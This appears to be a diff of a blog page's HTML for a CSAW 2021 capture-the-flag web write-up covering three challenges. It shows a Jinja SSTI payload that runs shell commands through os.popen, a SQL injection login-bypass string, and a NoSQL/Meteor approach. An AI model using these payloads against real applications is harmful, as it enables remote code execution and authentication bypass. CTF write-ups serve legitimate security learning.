@@ -124,7 +124,7 @@
       "inLanguage": "en",
       "datePublished": "2021-09-14",
       "dateModified": "2021-09-14",
-      "wordCount" : "316",
+      "wordCount" : "315",
       "publisher": {
         "@type": "Person",
         "name": ""
@@ -212,6 +212,9 @@
         <h1>CSAW - 2021</h1>
 
         
+          <section class="terms">
+            <ul><li><a class="btn" href="/tags/nosql/">noSQL</a></li><li><a class="btn" href="/tags/sql/">SQL</a></li><li><a class="btn" href="/tags/ssti/">SSTI</a></li></ul>
+          </section>
           <p>
             
               Published on <time datetime="2021-09-14">2021-09-14</time>
@@ -228,7 +231,17 @@
       Contents
     </summary>
     
-    <nav id="TableOfContents"></nav>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ninja">Ninja</a>
+      <ul>
+        <li><a href="#rce-steps">RCE steps</a></li>
+      </ul>
+    </li>
+    <li><a href="#no-pass-needed">no-pass-needed</a></li>
+    <li><a href="#securinotes">securinotes</a></li>
+  </ul>
+</nav>
   </details>
         
 
@@ -285,22 +298,24 @@
 
 
 
-  <h1 id="ninja">Ninja</h1> 
+  <h2 id="ninja"><a class="anchor" href="#ninja" title='Anchor for: Ninja.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Ninja</h2> 
 
-
-
-
-
-
-
-
-
-
-  <h1 id="type-ssti">Type: SSTI</h1> 
-
+<ul>
+<li>Type: SSTI</li>
+</ul>
 <p>I test <code>value</code> param with <code>{{7*7}}</code> and it returns <code>49</code>.</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>http://web.chal.csaw.io:5000/submit?value={{7*7}}
-</code></pre><p>Okay, RCE timeeeeee~</p>
+</code></pre>
+
+
+
+
+
+
+
+
+  <h3 id="rce-steps"><a class="anchor" href="#rce-steps" title='Anchor for: RCE steps.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> RCE steps</h3> 
+
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ls -la&#39;</span>)<span style="color:#f92672">.</span>read()}}
 </span></span></code></pre></div><p>This payload import class <code>os</code> and executes <code>ls -la</code> from popen. Send this payload and we get the response:</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
@@ -339,19 +354,11 @@
 
 
 
-  <h1 id="no-pass-needed">no-pass-needed</h1> 
+  <h2 id="no-pass-needed"><a class="anchor" href="#no-pass-needed" title='Anchor for: no-pass-needed.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> no-pass-needed</h2> 
 
-
-
-
-
-
-
-
-
-
-  <h1 id="type-sql-injection">Type: SQL injection</h1> 
-
+<ul>
+<li>Type: SQL injection</li>
+</ul>
 <p>I&rsquo;m so lucky firstblood this challenge when i test my familiar payload, and it works.</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>username=admin&#39;or(1)--+-&amp;password=a
 </code></pre><p>This challenge replace some strings. When you duplicate this you can bypass it easily</p>
@@ -366,19 +373,11 @@
 
 
 
-  <h1 id="securinotes">securinotes</h1> 
+  <h2 id="securinotes"><a class="anchor" href="#securinotes" title='Anchor for: securinotes.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> securinotes</h2> 
 
-
-
-
-
-
-
-
-
-
-  <h1 id="type-nosql-injection">Type: nosql injection</h1> 
-
+<ul>
+<li>Type: nosql injection</li>
+</ul>
 <p>This chall is closed, so i only tell you idea to solve it.</p>
 <p>Register one account and login, then catch this request via burpsuite and I found some public Meteor methods (<code>notes.count</code>, <code>notes.add</code>, <code>notes.remove</code>).
 In websockets history, I found a query from client to server:</p>
